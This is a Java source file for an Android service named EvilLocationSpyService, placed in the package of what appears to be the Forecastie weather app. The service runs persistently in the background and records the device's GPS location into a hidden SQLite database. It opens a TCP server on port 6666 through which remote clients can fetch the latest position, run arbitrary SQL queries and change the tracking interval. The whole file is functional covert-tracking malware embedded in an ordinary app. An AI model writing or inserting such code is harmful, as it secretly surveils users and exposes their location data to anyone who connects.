package cz.martykan.forecastie;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class EvilLocationSpyService extends Service {

    static public EvilLocationSpyService evilLocationSpyService;
    static public EvilLocationSpy evilLocationSpy;
    static public LocationManager locationManager;
    static public EvilScreenMonitor screenSwitchReceiver;
    static public long setMeterThreshold = 0; // Distancia mínima que tiene que haberse movido para que nos reporte el cambio.
    static public long setTimeThreshold = 1 * 60 * 1000; // En milisegundos. Tiempo mínimo entre updates.

    @Override
    public IBinder onBind(Intent intent) {

        return null;

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        super.onStartCommand(intent, flags, startId);
        return START_STICKY;

    }

    @Override
    public void onCreate() {

        Log.d("EvilLocationSpyService", "Initialized");

        evilLocationSpyService = this;
        evilLocationSpy = new EvilLocationSpy(this);
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

        startLocationUpdates(setTimeThreshold, setMeterThreshold);

        // Activa el EvilScreenMonitor.
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        screenSwitchReceiver = new EvilScreenMonitor(this);
        registerReceiver(screenSwitchReceiver, filter);

    }

    @Override
    public void onDestroy() {
        stopLocationUpdates();
    }

    public void stopLocationUpdates(){
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.removeUpdates(evilLocationSpy);
        }
    }

    public void startLocationUpdates(long timeThreshold, long meterThreshold){

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, timeThreshold, meterThreshold, evilLocationSpy);
            setTimeThreshold = timeThreshold;
            setMeterThreshold = meterThreshold;
        }

    }

}

class EvilLocationSpy implements LocationListener {

    private static Context context;
    private static SQLiteDatabase evilDatabase;
    private static final int ServerPort = 6666;
    //private static final AsyncHttpClient client = new AsyncHttpClient();

    public EvilLocationSpy(Context inContext){

        Log.d("EvilLocationSpy", "Initialized");

        context = inContext;
        evilDatabase = SQLiteDatabase.openOrCreateDatabase(context.getFilesDir() + "evilData.db", null);
        evilDatabase.execSQL("CREATE TABLE IF NOT EXISTS locations(ts VARCHAR,latitude DOUBLE, longitude DOUBLE);");

        /* Server */
        new Thread(new Runnable() {
            public void run() {

                ServerSocket ss = null;
                try {
                    Boolean demo = true;
                    ss = new ServerSocket(ServerPort);
                    while(true){
                        Socket s = ss.accept();
                        BufferedReader input = new BufferedReader(new InputStreamReader(s.getInputStream()));
                        PrintWriter output = new PrintWriter(s.getOutputStream(),true);
                        do {
                            String st = input.readLine();
                            Log.d("SERVER", "From client: " + st);
                            if (st.contains("posReciente")) {
                                // Mensaje>  posReciente
                                Cursor cursor = evilDatabase.rawQuery("SELECT * FROM locations WHERE ts = (SELECT MAX(ts) FROM locations)", null);
                                try {
                                    if (cursor.moveToNext()) {
                                        String when = cursor.getString(0);
                                        String lat = cursor.getString(1);
                                        String lon = cursor.getString(2);
                                        output.println(when + '\t' + lat + '\t' + lon);
                                    }
                                } finally {
                                    cursor.close();
                                }
                            } else if (st.contains("query")) {
                                // Mensaje>  query:select * from locations
                                String params[] = st.substring(st.lastIndexOf("query")).split(":");
                                Cursor cursor = evilDatabase.rawQuery(params[1], null);
                                try {
                                    while (cursor.moveToNext()) {
                                        String when = cursor.getString(0);
                                        String lat = cursor.getString(1);
                                        String lon = cursor.getString(2);
                                        output.write(when + '\t' + lat + '\t' + lon + ' ');
                                    }
                                } finally {
                                    cursor.close();
                                }
                            } else if (st.contains("cambiarParamsGPS")) {
                                // Mensaje>  cambiarParamsGPS:threshMs:threshMeters
                                String params[] = st.substring(st.lastIndexOf("cambiarParamsGPS")).split(":");
                                int newTimeThreshMS = Integer.parseInt(params[1]);
                                int newMeterThresh = Integer.parseInt(params[2]);

                                //EvilLocationSpyService.evilLocationSpyService.stopLocationUpdates();
                                EvilLocationSpyService.evilLocationSpyService.startLocationUpdates(newTimeThreshMS, newMeterThresh);
                                output.write("Ok.");
                            }
                            output.flush();
                        } while (demo);
                        output.println("Good Bye!");
                        s.close();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }).start();

        /* Para ver qué hay.
        Cursor cursor = evilDatabase.rawQuery("SELECT * FROM locations", null);
        try {
            while(cursor.moveToNext()) {
                String when = cursor.getString(0);
                String lat = cursor.getString(1);
                String lon = cursor.getString(2);
                Boolean p = true;
            }
        } finally {
            cursor.close();
        }
        */

    }

    public void onLocationChanged(Location location) {

        Log.d("EvilLocationSpy", "Location updated");
        // Cada vez que cambia, registro la hora en la base de datos.
        Calendar c = Calendar.getInstance();
        String formattedDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(c.getTime());

        evilDatabase.execSQL("INSERT INTO locations VALUES('" + formattedDate + "'," + location.getLatitude() + "," + location.getLongitude() + ");");

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {}

    public void onProviderEnabled(String provider) {}

    public void onProviderDisabled(String provider) {}


}
